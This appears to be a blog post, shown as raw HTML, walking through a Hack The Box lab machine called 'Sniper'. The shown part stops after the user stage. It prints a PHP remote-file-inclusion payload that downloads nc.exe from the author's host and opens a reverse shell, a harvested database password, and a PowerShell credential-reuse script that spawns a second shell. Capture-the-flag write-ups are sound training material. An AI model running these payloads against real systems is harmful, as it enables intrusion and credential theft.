<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script> </script> <script type="text/javascript" src="/lightgallery/lightbox.js"></script><link rel="stylesheet" href="/lightgallery/lightbox.css"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/syntax.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/syntax.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script><meta name="description" content="Identifying the RFI and exploiting it by executing our script using smb service and getting credentials of chris,Running command as chris and getting a Shell as chris.Best part of the machine to create a chm file and embeding our Command init , the boss will Execute the File on it own" /><meta property="og:title" content="Hackthebox Sniper writeup" /><meta property="og:description" content="Identifying the RFI and exploiting it by executing our script using smb service and getting credentials of chris,Running command as chris and getting a Shell as chris.Best part of the machine to create a chm file and embeding our Command init , the boss will Execute the File on it own" /><meta property="og:image" content="/hackthebox/sniper/sniper.png" /><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Sniper writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Identifying the RFI and exploiting it by executing our script using smb service and getting credentials of chris,Running command as chris and getting a Shell as chris.Best part of the machine to create a chm file and embeding our Command init , the boss will Execute the File on it own"><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/sniper/sniper.png"><title>Hackthebox Sniper writeup | 0xPrashant</title><meta name="generator" content="Jekyll v4.1.0" /><meta property="og:title" content="Hackthebox Sniper writeup" /><meta name="author" content="Prashant Saini" /><meta property="og:locale" content="en_US" /><meta name="description" content="information" /><meta property="og:description" content="information" /><link rel="canonical" href="http://0xprashant.github.io/posts/htb-sniper/" /><meta property="og:url" content="http://0xprashant.github.io/posts/htb-sniper/" /><meta property="og:site_name" content="0xPrashant" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-03-27T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Sniper writeup" /><meta name="twitter:site" content="@0xprashant" /><meta name="twitter:creator" content="@Prashant Saini" /><meta name="google-site-verification" content="UfGDXP7MiKxFhS_R1LKVTpk3Cf20Hj-53gHZJrOFXuA" /> <script type="application/ld+json"> {"@type":"BlogPosting","url":"http://0xprashant.github.io/posts/htb-sniper/","headline":"Hackthebox Sniper writeup","dateModified":"2020-06-17T07:03:57+00:00","datePublished":"2020-03-27T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://0xprashant.github.io/posts/htb-sniper/"},"author":{"@type":"Person","name":"Prashant Saini"},"description":"information","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/main.css"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script> window.jQuery || document.write('<script src="/assets/lib/jquery-3.4.1.min.js"><\/script>'); </script> <script src="https://cdn.jsdelivr.net/npm/popper.js@1.15.0/dist/umd/popper.min.js" integrity="sha256-fTuUgtT7O2rqoImwjrhDgbXTKUwyxxujIMRIK7TbuNU=" crossorigin="anonymous" async></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha256-5+02zu5UULQkO7w1GIr6vftCgMfFdZcAHeDtFnKZsBs=" crossorigin="anonymous" async></script> <script src="/assets/js/dist/commons.js" async></script> <script src="/assets/js/dist/timeago.min.js" async></script><link rel="preload" as="style" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/syntax.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/syntax.css"><link rel="preload" as="style" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css"><link rel="preload" as="script" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js"><link rel="stylesheet" href="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.css" /> <script src="/assets/lib/bootstrap-toc-1.0.1/bootstrap-toc.min.js" async></script> <script src="/assets/js/dist/toc.min.js" async></script><meta name="description" content="Identifying the RFI and exploiting it by executing our script using smb service and getting credentials of chris,Running command as chris and getting a Shell as chris.Best part of the machine to create a chm file and embeding our Command init , the boss will Execute the File on it own" /><meta property="og:title" content="Hackthebox Sniper writeup" /><meta property="og:description" content="Identifying the RFI and exploiting it by executing our script using smb service and getting credentials of chris,Running command as chris and getting a Shell as chris.Best part of the machine to create a chm file and embeding our Command init , the boss will Execute the File on it own" /><meta property="og:image" content="/hackthebox/sniper/sniper.png" /><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Sniper writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Identifying the RFI and exploiting it by executing our script using smb service and getting credentials of chris,Running command as chris and getting a Shell as chris.Best part of the machine to create a chm file and embeding our Command init , the boss will Execute the File on it own"><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/sniper/sniper.png"> <script src="/assets/js/dist/tooltip-loader.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avater1.png" alt="avatar"> </a></div><div class="profile-text mt-3"><div id="site-title"> <a href="/">0xPrashant</a></div><div id="site-subtitle" class="font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-3 mr-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/donation/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fab fa-donate ml-3 mr-3 unloaded"></i> <span>DONATION-OSCP</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-3 mr-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-3 mr-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-3 mr-3 unloaded"></i> <span>TIMELINE</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-3 mr-3 unloaded"></i> <span>WHOAMI</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" light-mode-invisible></i> <i class="mode-toggle fas fa-moon" dark-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isDarkPrefer) { this.setDark(); } } else { if (this.isDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isDarkPrefer) { self.setDark(); } } else { if (self.isDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isDarkPrefer() { return true; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if ((this.mode == null && this.isDarkPrefer) || this.mode == ModeToggle.DARK_MODE) { this.setLight(); } else { /* light mode or default-light */ this.setDark(); } } } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <!--<a href="https://facebook.com/prashant.saini.37201" target="_blank"> <i class="fab fa-facebook"></i> </a>--> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a> <!--<a href="javascript:window.open('mailto:' + ['Prashant.saini345','gmail.com'].join('@'))"> <i class="fas fa-envelope"></i> </a>--></div></div><div id="main-wrapper"> <!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Sniper writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Sniper writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago" data-toggle="tooltip" data-placement="bottom" title="Fri, Mar 27, 2020, 12:00 AM +0000"> Mar 27, 2020 <i class="unloaded">2020-03-27T00:00:00+00:00</i> </span> on <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div></div><div class="post-content"> <img src="/hackthebox/sniper/sniper.png"><h1 id="information">information</h1><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Sniper<tr><td>Points<td>30<tr><td>Difficulty<td>Medium<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/8308" target="_blank">MinatoTW</a><tr><td>creator’s Twitter<td><a href="https://twitter.com/minatotw_" target="_blank">@MinatoTW_</a><tr><td>Out On<td>5 OCt 2019<tr><td>Retired on<td>28 march 2020</table><h1 id="summary">Summary</h1><ul><li>Identifying the <code class="language-plaintext highlighter-rouge">RFI</code></li><li><code class="language-plaintext highlighter-rouge">Rfi</code> using <code class="language-plaintext highlighter-rouge">smb</code> server</li><li>Get creds of Chris</li><li>running command as <code class="language-plaintext highlighter-rouge">chris</code> and get shell as <code class="language-plaintext highlighter-rouge">chris</code></li><li><code class="language-plaintext highlighter-rouge">Getting User.txt</code></li><li>creating a malicious <code class="language-plaintext highlighter-rouge">chm</code> file</li><li>Moving it to /Docs so boss can execute it</li><li><code class="language-plaintext highlighter-rouge">Getting Root.txt</code></li></ul><h1 id="got-root">Got root</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/sniper/sniper.cast" start-at="23" autoplay="1" speed="3" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: 17h01m16s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2020-02-05T10:39:10
|_  start_date: N/A
</pre></table></code></div></div><h2 id="port-80">Port 80</h2><p>Port <code class="language-plaintext highlighter-rouge">80</code> is opened , lets check whats on the website</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="/hackthebox/sniper/image-01.png" alt="Website" /></p><p>i found a blog page on the website too</p><p>And the Language option on the bar get into my eyes</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="/hackthebox/sniper/image-02.png" alt="Website" /></p><p>When i changed the language to english or something else i got a parameter of ?lang=lang.php</p><p>I think of the RFI as soon as i saw this</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://sniper.htb/blog/?lang=blog-en.php
</pre></table></code></div></div><p>Lets check with samba server , I will host a samba server on my machine and will try to access it with <code class="language-plaintext highlighter-rouge">?lang=\\ip\share\exploit.php</code></p><blockquote><p>For some reason i was unable to use <code class="language-plaintext highlighter-rouge">impacket smbserver.py</code> .Maybe because of the low version of smb on the sniper</p></blockquote><p>i will Use samba server for executing the php files</p><p>my <code class="language-plaintext highlighter-rouge">smb.conf</code> is</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="o">[</span>global]:
    security <span class="o">=</span> user
    map to guest <span class="o">=</span> bad user
    <span class="nb">bind </span>interfaces only <span class="o">=</span> <span class="nb">yes
    </span>encrypt passwords <span class="o">=</span> <span class="nb">yes
    </span>name resolve order <span class="o">=</span> bcast host
    workgroup <span class="o">=</span> WORKGROUP
    winbind use default domain <span class="o">=</span> <span class="nb">yes
    </span>dns proxy <span class="o">=</span> no
    server string <span class="o">=</span> Samba Server %v
    winbind trusted domains only <span class="o">=</span> <span class="nb">yes
    </span>null passwords <span class="o">=</span> <span class="nb">yes
    </span>netbios name <span class="o">=</span> prashant
<span class="o">[</span>public]:
    force user <span class="o">=</span> nobody
    path <span class="o">=</span> /root/share
    public <span class="o">=</span> <span class="nb">yes
    </span>writeable <span class="o">=</span> <span class="nb">yes
    </span>directory mask <span class="o">=</span> 0755
    create mask <span class="o">=</span> 0644
    browseable <span class="o">=</span> <span class="nb">yes
    </span>available <span class="o">=</span> <span class="nb">yes
    </span>guest ok <span class="o">=</span> <span class="nb">yes</span>
</pre></table></code></div></div><h1 id="exploiting-the-rfi">Exploiting the RFI</h1><p>Lets try with a ping to my parrot machine</p><p>My php file will contain</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;?php shell_exec( "cmd /c ping -n 1 &lt;IP&gt;")?&gt;
</pre></table></code></div></div><p>And used tcpdump for checking and capturing and analyzing the packets sent by the machine</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$tcpdump</span> <span class="nt">-i</span> tun0 <span class="nt">-n</span> icmp
tcpdump: verbose output suppressed, use <span class="nt">-v</span> or <span class="nt">-vv</span> <span class="k">for </span>full protocol decode
listening on tun0, link-type RAW <span class="o">(</span>Raw IP<span class="o">)</span>, capture size 262144 bytes
13:10:14.751039 IP 10.10.10.151 <span class="o">&gt;</span> 10.10.15.32: ICMP <span class="nb">echo </span>request, <span class="nb">id </span>1, <span class="nb">seq </span>1, length 40
13:10:14.751102 IP 10.10.15.32 <span class="o">&gt;</span> 10.10.10.151: ICMP <span class="nb">echo </span>reply, <span class="nb">id </span>1, <span class="nb">seq </span>1, length 40
^C
2 packets captured
2 packets received by filter
0 packets dropped by kernel
</pre></table></code></div></div><p>And we confirmed the RFI with the captured packets by TCPDUMP</p><p>Now my next attempt was to get a reverse shell Using the RFI, I create the another php script with the following code to download the nc.exe from my Python Server and give me Connection back</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">'powershell iwr -uri 10.10.15.32:8080/nc.exe -o C:\Windows\Temp\nc.exe;C:\Windows\Temp\nc.exe -e powershell 10.10.15.32 1234'</span><span class="p">)</span><span class="cp">?&gt;</span>
</pre></table></code></div></div><p>And as we execute the file with <code class="language-plaintext highlighter-rouge">?lang=\\10.10.x.x\public\exploit.php</code></p><p>The python server got a 200 ok request for nc.exe</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>┌─[✗]─[prashant@parrot]─[/home/prashant/Desktop/everything_is_here/hackthebox/Tools]
└──╼ <span class="nv">$python</span> <span class="nt">-m</span> SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
10.10.10.151 - - <span class="o">[</span>08/Feb/2020 13:21:38] <span class="s2">"GET /nc.exe HTTP/1.1"</span> 200 -
</pre></table></code></div></div><p>And we on the other hand we got the shell</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>┌─[✗]─[prashant@parrot]─[/home/prashant]
└──╼ <span class="nv">$nc</span> <span class="nt">-nlvp</span> 1234
listening on <span class="o">[</span>any] 1234 ...
connect to <span class="o">[</span>10.10.15.32] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.151] 49851
Windows PowerShell 
Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
PS C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot<span class="se">\b</span>log&gt; 
</pre></table></code></div></div><p>Now we have to get the user.txt which is owned by the user Chris , So we cant read it we have to escalate to user Chris first</p><p>After doing some enum in the same dirs i got a db.php file which contains some creds</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nv">$cat</span> <span class="nx">db</span><span class="o">.</span><span class="nx">php</span>
<span class="o">&lt;?</span><span class="nx">php</span>
<span class="c1">// Enter your Host, username, password, database below.</span>
<span class="c1">// I left password empty because i do not set password on localhost.</span>
<span class="nv">$con</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="s2">"localhost"</span><span class="p">,</span><span class="s2">"dbuser"</span><span class="p">,</span><span class="s2">"36mEAhz/B8xQ~2VM"</span><span class="p">,</span><span class="s2">"sniper"</span><span class="p">);</span>
<span class="c1">// Check connection</span>
<span class="k">if</span> <span class="p">(</span><span class="nx">mysqli_connect_errno</span><span class="p">())</span>
  <span class="p">{</span>
  <span class="k">echo</span> <span class="s2">"Failed to connect to MySQL: "</span> <span class="o">.</span> <span class="nx">mysqli_connect_error</span><span class="p">();</span>
  <span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>So now we have a password maybe its of the user chris , i tried to check that with <code class="language-plaintext highlighter-rouge">powershell’s Invoke-Command</code> that will give me reverse shell by using the creds we got</p><p>And made a powershell script for this</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>┌─[prashant@parrot]─[/home/prashant/Desktop/everything_is_here/hackthebox/machines/sniper]
└──╼ <span class="nv">$cat</span> getshell.ps1 
<span class="nv">$username</span> <span class="o">=</span> <span class="s1">'SNIPER\Chris'</span>
<span class="nv">$password</span> <span class="o">=</span> <span class="s1">'36mEAhz/B8xQ~2VM'</span>
<span class="nv">$securePassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="nv">$password</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
<span class="nv">$credential</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential <span class="nv">$username</span>, <span class="nv">$securePassword</span>
Invoke-command <span class="nt">-computername</span> SNIPER <span class="nt">-credential</span> <span class="nv">$credential</span> <span class="nt">-scriptblock</span> <span class="o">{</span> cmd.exe /c <span class="s2">"C:</span><span class="se">\t</span><span class="s2">mp</span><span class="se">\n</span><span class="s2">c.exe"</span> <span class="nt">-e</span> powershell 10.10.15.32 4444 <span class="o">}</span>
</pre></table></code></div></div><p>And i downloaded the nc.exe and getshell.ps1 to the machine</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">iwr</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">10.10.15.32:8080/nc.exe</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">C:\tmp\nc.exe</span><span class="w">
</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nf">iwr</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">10.10.15.32:8080/getshell.ps1</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">C:\tmp\gs.ps1</span><span class="w">
</span></pre></table></code></div></div><p>and after running the gs.ps1 using the .\gs.ps1 we got the shell as chris</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌─[✗]─[prashant@parrot]─[/home/prashant]
└──╼ <span class="nv">$nc</span> <span class="nt">-nlvp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.15.32] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.151] 49896
Windows PowerShell 
Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.
PS C:<span class="se">\U</span>sers<span class="se">\C</span>hris<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
whoami
</span>sniper<span class="se">\c</span>hris
PS C:<span class="se">\U</span>sers<span class="se">\C</span>hris<span class="se">\D</span>ocuments&gt; 
</pre></table></code></div></div><h2 id="got-usertxt">Got user.txt</h2><p>Without wasting any time i grabbed the user.txt</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\Chris\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
</span><span class="nf">cat</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
</span><span class="mi">21</span><span class="nf">f------------------------cf56e</span><span class="w">
</span><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\Chris\Desktop</span><span class="err">&gt;</span><span class="w"> 
</span></pre></table></code></div></div><p>Now i checked every dir that i can and i found two interesting files</p><ul><li>note.txt</li></ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>PS C:<span class="se">\D</span>ocs&gt; <span class="nb">cat </span>note.txt
<span class="nb">cat </span>note.txt
Hi Chris,
